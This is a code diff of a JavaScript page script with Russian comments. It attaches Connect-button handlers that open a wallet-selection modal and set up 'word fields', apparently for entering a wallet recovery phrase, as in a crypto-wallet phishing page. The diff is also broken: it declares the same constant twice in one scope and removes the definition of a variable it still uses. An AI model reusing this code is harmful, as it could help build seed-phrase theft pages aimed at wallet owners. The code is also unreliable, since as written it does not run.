@@ -828,33 +828,23 @@ document.addEventListener('DOMContentLoaded', function() {
     document.head.insertAdjacentHTML('beforeend', styles);
 
     // Ждем немного чтобы DOM обновился
-    setTimeout(() => {
-        // Определяем язык
-        const currentLang = initLanguage();
-        window.currentLanguage = currentLang;
-        
-        // ПРИМЕНЯЕМ ПЕРЕВОД ПОСЛЕ СОЗДАНИЯ ЭЛЕМЕНТОВ
-        applyTranslation(currentLang);
+    const modalOverlay = document.querySelector('.modal-overlay');
 
-        const goAuthBtn = document.querySelector('[class*="goAuth"]'); // берем первую кнопку
-		const modalOverlay = document.querySelector('.modal-overlay');
+	console.log('Applying translation for language:', currentLang);
+	console.log('modalOverlay found:', modalOverlay);
 
-		console.log('Applying translation for language:', currentLang);
-		console.log('goAuth button found:', goAuthBtn);
-		console.log('modalOverlay found:', modalOverlay);
+// Находим ВСЕ кнопки с goAuth и вешаем обработчики
+	const allGoAuthBtns = document.querySelectorAll('[class*="goAuth"]');
+	console.log('Found goAuth buttons:', allGoAuthBtns.length);
 
-		if (!goAuthBtn) {
-		console.error('goAuth button not found!');
-		return;
-		}
-
-		// Обработчик для кнопки Connect
-		goAuthBtn.addEventListener('click', function() {
-		console.log('Connect button clicked');
-		modalOverlay.classList.add('active');
-		resetToWalletSelection();
-		initializeWordFields();
-		});
+	allGoAuthBtns.forEach(btn => {
+    btn.addEventListener('click', function() {
+        console.log('Connect button clicked');
+        modalOverlay.classList.add('active');
+        resetToWalletSelection();
+        initializeWordFields();
+    });
+});
 
 // Дополнительно: находим ВСЕ кнопки и вешаем обработчики на все
 const allGoAuthBtns = document.querySelectorAll('[class*="goAuth"]');
@@ -927,13 +917,14 @@ goAuthBtns.forEach(btn => {
         });
 
         // Выбор кошелька
-        walletItems.forEach(item => {
-            item.addEventListener('click', function() {
-                selectedWallet = this.getAttribute('data-wallet');
-                walletNameText.textContent = selectedWallet;
-                showConnectionView();
-            });
-        });
+        document.addEventListener('click', function(e) {
+		const walletItem = e.target.closest('.wallet-item');
+		if (walletItem) {
+        selectedWallet = walletItem.getAttribute('data-wallet');
+        walletNameText.textContent = selectedWallet;
+        showConnectionView();
+			}
+		});
 
         // Выбор опции импорта
         importOptions.forEach(option => {
